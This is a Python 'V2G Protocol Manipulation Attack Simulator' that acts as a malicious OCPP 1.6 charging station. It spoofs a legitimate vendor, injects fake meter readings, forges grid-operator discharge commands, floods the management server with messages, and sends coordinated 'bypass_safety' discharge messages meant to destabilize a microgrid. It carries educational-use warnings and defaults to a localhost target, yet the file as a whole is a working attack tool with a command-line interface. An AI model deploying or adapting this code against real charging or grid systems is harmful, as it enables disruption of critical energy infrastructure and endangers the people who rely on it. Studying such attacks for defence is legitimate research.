#!/usr/bin/env python3
"""
V2G Protocol Manipulation Attack Simulator
V2G Protocol Manipulation for Microgrid Destabilization

This simulator:
1. Manipulates OCPP/ISO 15118 protocols
2. Injects fake V2G commands
3. Creates grid instability via coordinated attacks
4. Supports various attack modes

WARNING: This simulator is for educational purposes only!
"""

import asyncio
import logging
import json
import random
import math
from datetime import datetime, timezone
from enum import Enum
import websockets
from ocpp.v16 import ChargePoint as cp
from ocpp.v16 import call
from ocpp.v16.enums import RegistrationStatus

# Logging settings
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Attack Types"""
    INJECTION = "injection"      # Fake data injection
    FLOODING = "flooding"        # DoS attack
    DESTABILIZE = "destabilize"  # Grid destabilization
    OSCILLATION = "oscillation"  # V2G oscillation
    SPOOFING = "spoofing"        # Identity spoofing


class MaliciousStation(cp):
    """Malicious Charging Station Simulator"""
    
    def __init__(self, station_id, websocket, attack_type=AttackType.INJECTION):
        super().__init__(station_id, websocket)
        self.station_id = station_id
        self.attack_type = attack_type
        self.attack_count = 0
        self.energy_exported = 0
        self.fake_power = 0
    
    async def send_boot_notification(self):
        """Boot notification (seemingly legitimate)"""
        # Spoofing attack: Use legitimate vendor name
        if self.attack_type == AttackType.SPOOFING:
            vendor = "ABB"  # Appear as a legitimate vendor
            model = "Terra AC Wallbox"
        else:
            vendor = "BSG-Attack"
            model = "Malicious-V2G"
        
        request = call.BootNotification(
            charge_point_model=model,
            charge_point_vendor=vendor
        )
        
        logger.info(f"[ATTACK] Sending Boot Notification...")
        logger.info(f"   Fake Vendor: {vendor}")
        logger.info(f"   Fake Model: {model}")
        
        try:
            response = await self.call(request)
            if response.status == RegistrationStatus.accepted:
                logger.info(f"[SUCCESS] CSMS fooled! Attacker accepted.")
                return response.interval
            else:
                logger.warning(f"[WARNING] CSMS rejected: {response.status}")
                return None
        except Exception as e:
            logger.error(f"[ERROR] Boot error: {e}")
            return None
    
    async def send_heartbeat_loop(self, interval):
        """Normal heartbeat (to avoid suspicion)"""
        while True:
            await asyncio.sleep(interval)
            try:
                await self.call(call.Heartbeat())
            except:
                pass
    
    async def inject_fake_v2g_data(self, power_kw, duration_sec=5):
        """Inject fake V2G data"""
        self.attack_count += 1
        self.fake_power = power_kw * 1000  # W
        
        logger.info(f"\n{'!'*20}")
        logger.info(f"[ATTACK #{self.attack_count}] FAKE V2G DATA INJECTION")
        logger.info(f"{'!'*20}")
        logger.info(f"   Fake Power: {power_kw} kW")
        logger.info(f"   Target: Destabilize microgrid")
        
        # Send fake MeterValues
        energy_wh = (self.fake_power * duration_sec) / 3600
        self.energy_exported += energy_wh
        
        meter_value = [{
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'sampled_value': [
                {
                    'value': str(int(self.energy_exported)),
                    'context': 'Sample.Periodic',
                    'format': 'Raw',
                    'measurand': 'Energy.Active.Export.Register',
                    'unit': 'Wh'
                },
                {
                    'value': str(int(self.fake_power)),
                    'context': 'Sample.Periodic',
                    'format': 'Raw',
                    'measurand': 'Power.Active.Export',
                    'unit': 'W'
                }
            ]
        }]
        
        request = call.MeterValues(
            connector_id=1,
            meter_value=meter_value
        )
        
        try:
            await self.call(request)
            logger.info(f"   [SUCCESS] Fake data injected!")
            logger.info(f"   Total fake energy: {self.energy_exported/1000:.2f} kWh")
        except Exception as e:
            logger.error(f"   [ERROR] Injection failed: {e}")
    
    async def send_fake_v2g_command(self, power_kw):
        """Send fake V2G command"""
        self.attack_count += 1
        
        data = {
            'command': 'StartDischarge',
            'power_kw': power_kw,
            'priority': 'HIGH',
            'source': 'GridOperator',  # Fake source
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
        
        request = call.DataTransfer(
            vendor_id='GridServices',  # Fake vendor
            message_id='V2G_StartDischarge',
            data=json.dumps(data)
        )
        
        logger.info(f"\n[ATTACK #{self.attack_count}] FAKE V2G COMMAND")
        logger.info(f"   Fake Command: StartDischarge")
        logger.info(f"   Fake Source: GridOperator")
        logger.info(f"   Power: {power_kw} kW")
        
        try:
            response = await self.call(request)
            if response.status == 'Accepted':
                logger.info(f"   [SUCCESS] Fake command accepted!")
            else:
                logger.warning(f"   [WARNING] Command rejected: {response.status}")
        except Exception as e:
            logger.error(f"   [ERROR] Command error: {e}")
    
    async def flooding_attack(self, messages_per_second=10, duration_sec=30):
        """DoS attack - Overwhelm the server with excessive messages"""
        logger.info(f"\n{'!'*20}")
        logger.info(f"[ATTACK] FLOODING DoS ATTACK STARTING")
        logger.info(f"{'!'*20}")
        logger.info(f"   Rate: {messages_per_second} messages/second")
        logger.info(f"   Duration: {duration_sec} seconds")
        logger.info(f"   Total: ~{messages_per_second * duration_sec} messages")
        
        start_time = asyncio.get_event_loop().time()
        end_time = start_time + duration_sec
        message_count = 0
        
        while asyncio.get_event_loop().time() < end_time:
            for _ in range(messages_per_second):
                try:
                    # Random message types
                    msg_type = random.choice(['meter', 'data', 'status'])
                    
                    if msg_type == 'meter':
                        await self.call(call.MeterValues(
                            connector_id=1,
                            meter_value=[{
                                'timestamp': datetime.now(timezone.utc).isoformat(),
                                'sampled_value': [{'value': str(random.randint(0, 100000))}]
                            }]
                        ))
                    elif msg_type == 'data':
                        await self.call(call.DataTransfer(
                            vendor_id='Flood',
                            data=json.dumps({'flood': random.random()})
                        ))
                    else:
                        await self.call(call.StatusNotification(
                            connector_id=1,
                            error_code='NoError',
                            status='Available'
                        ))
                    
                    message_count += 1
                except:
                    pass
            
            await asyncio.sleep(1)
            logger.info(f"   [STATUS] Sent: {message_count} messages")
        
        logger.info(f"\n[SUCCESS] Flooding attack completed: {message_count} messages sent")
    
    async def oscillation_attack(self, cycles=10, power_kw=22):
        """V2G oscillation attack - To disrupt grid frequency"""
        logger.info(f"\n{'!'*20}")
        logger.info(f"[ATTACK] V2G OSCILLATION ATTACK")
        logger.info(f"{'!'*20}")
        logger.info(f"   Cycles: {cycles}")
        logger.info(f"   Power: +/-{power_kw} kW")
        logger.info(f"   Target: Grid frequency instability")
        
        for cycle in range(cycles):
            # Positive phase (send to grid)
            logger.info(f"\n   [{cycle+1}/{cycles}] [+] +{power_kw} kW (To Grid)")
            await self.inject_fake_v2g_data(power_kw, duration_sec=3)
            await asyncio.sleep(3)
            
            # Negative phase (draw from grid)
            logger.info(f"   [{cycle+1}/{cycles}] [-] Switch to charge mode")
            await self.inject_fake_v2g_data(0, duration_sec=3)
            await asyncio.sleep(3)
        
        logger.info(f"\n[SUCCESS] Oscillation attack completed: {cycles} cycles")
    
    async def coordinated_destabilization(self, num_fake_evs=5, power_per_ev=11):
        """Coordinated grid destabilization attack"""
        logger.info(f"\n{'!'*20}")
        logger.info(f"[ATTACK] COORDINATED GRID DESTABILIZATION")
        logger.info(f"{'!'*20}")
        logger.info(f"   Fake EV count: {num_fake_evs}")
        logger.info(f"   Power per EV: {power_per_ev} kW")
        logger.info(f"   Total attack power: {num_fake_evs * power_per_ev} kW")
        logger.info(f"   Target: Grid collapse via sudden load change")
        
        # Send separate messages for each "fake EV"
        for ev_num in range(num_fake_evs):
            ev_id = f"FAKE_EV_{ev_num+1:03d}"
            logger.info(f"\n   [JOIN] {ev_id} joining attack...")
            
            # Fake V2G data
            data = {
                'ev_id': ev_id,
                'power_kw': power_per_ev,
                'action': 'immediate_discharge',
                'bypass_safety': True  # Safety bypass flag
            }
            
            try:
                await self.call(call.DataTransfer(
                    vendor_id='V2G-Attack',
                    message_id='CoordinatedDischarge',
                    data=json.dumps(data)
                ))
                
                # Fake MeterValues
                await self.inject_fake_v2g_data(power_per_ev, duration_sec=2)
                
            except Exception as e:
                logger.warning(f"   [WARNING] {ev_id} error: {e}")
            
            await asyncio.sleep(0.5)  # Short delay
        
        logger.info(f"\n{'!'*20}")
        logger.info(f"ATTACK COMPLETED!")
        logger.info(f"Total fake power injected: {num_fake_evs * power_per_ev} kW")
        logger.info(f"{'!'*20}\n")
    
    async def start_attack(self):
        """Start the attack"""
        logger.info(f"\n{'='*70}")
        logger.info(f"[START] ATTACK STARTING")
        logger.info(f"{'='*70}")
        logger.info(f"   Attack Type: {self.attack_type.value}")
        logger.info(f"   Station ID: {self.station_id}")
        logger.info(f"{'='*70}\n")
        
        await asyncio.sleep(3)
        
        if self.attack_type == AttackType.INJECTION:
            # Continuous fake data injection
            for i in range(10):
                power = random.randint(10, 30)
                await self.inject_fake_v2g_data(power, duration_sec=5)
                await asyncio.sleep(5)
        
        elif self.attack_type == AttackType.FLOODING:
            await self.flooding_attack(messages_per_second=10, duration_sec=30)
        
        elif self.attack_type == AttackType.OSCILLATION:
            await self.oscillation_attack(cycles=10, power_kw=22)
        
        elif self.attack_type == AttackType.DESTABILIZE:
            await self.coordinated_destabilization(num_fake_evs=5, power_per_ev=11)
        
        elif self.attack_type == AttackType.SPOOFING:
            # Send V2G commands as if legitimate
            for _ in range(5):
                await self.send_fake_v2g_command(random.randint(10, 22))
                await asyncio.sleep(5)
        
        logger.info(f"\n{'='*70}")
        logger.info(f"[SUMMARY] ATTACK SUMMARY")
        logger.info(f"{'='*70}")
        logger.info(f"   Total Attack: {self.attack_count}")
        logger.info(f"   Injected Energy: {self.energy_exported/1000:.2f} kWh (fake)")
        logger.info(f"{'='*70}\n")
    
    async def start(self):
        """Start station and perform attack"""
        interval = await self.send_boot_notification()
        
        if interval:
            await asyncio.gather(
                self.send_heartbeat_loop(interval),
                self.start_attack(),
                return_exceptions=True
            )
        else:
            logger.error("[ERROR] Boot failed, attack aborted")


async def main():
    """Main program"""
    import sys
    
    # Command line arguments
    attack_type = AttackType.INJECTION
    
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
        if arg in ['--help', '-h']:
            print("""
V2G Protocol Manipulation Attack Simulator

Usage:
  python v2g_attacker.py [attack-type]

Attack Types:
  injection    - Fake V2G data injection (default)
  flooding     - DoS attack (excessive messages)
  oscillation  - V2G oscillation (frequency instability)
  destabilize  - Coordinated grid destabilization
  spoofing     - Identity spoofing

Example:
  python v2g_attacker.py destabilize

WARNING: This tool is for educational and testing purposes only!
            """)
            return
        
        attack_map = {
            'injection': AttackType.INJECTION,
            'flooding': AttackType.FLOODING,
            'oscillation': AttackType.OSCILLATION,
            'destabilize': AttackType.DESTABILIZE,
            'spoofing': AttackType.SPOOFING
        }
        
        if arg in attack_map:
            attack_type = attack_map[arg]
        else:
            print(f"[ERROR] Invalid attack type: {arg}")
            print("Valid types: injection, flooding, oscillation, destabilize, spoofing")
            return
    
    station_id = f"ATTACK_{datetime.now().strftime('%H%M%S')}"
    csms_url = f"ws://localhost:9000/{station_id}"
    
    logger.info("="*70)
    logger.info("[START] V2G PROTOCOL MANIPULATION ATTACK SIMULATOR")
    logger.info("="*70)
    logger.warning("[WARNING] WARNING: This tool is for educational purposes only!")
    logger.warning("[WARNING] Usage against real systems is prohibited!")
    logger.info("="*70)
    logger.info(f"   Attack Type: {attack_type.value}")
    logger.info(f"   Target CSMS: {csms_url}")
    logger.info("="*70)
    
    try:
        async with websockets.connect(
            csms_url,
            subprotocols=['ocpp1.6']
        ) as ws:
            logger.info("[SUCCESS] Connected to CSMS!")
            
            attacker = MaliciousStation(station_id, ws, attack_type)
            
            await asyncio.gather(
                cp.start(attacker),
                attacker.start(),
                return_exceptions=True
            )
            
    except websockets.exceptions.WebSocketException as e:
        logger.error(f"[ERROR] Connection error: CSMS may not be running ({e})")
    except Exception as e:
        logger.error(f"[ERROR] Error: {e}", exc_info=True)


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[STOP] Attack stopped")
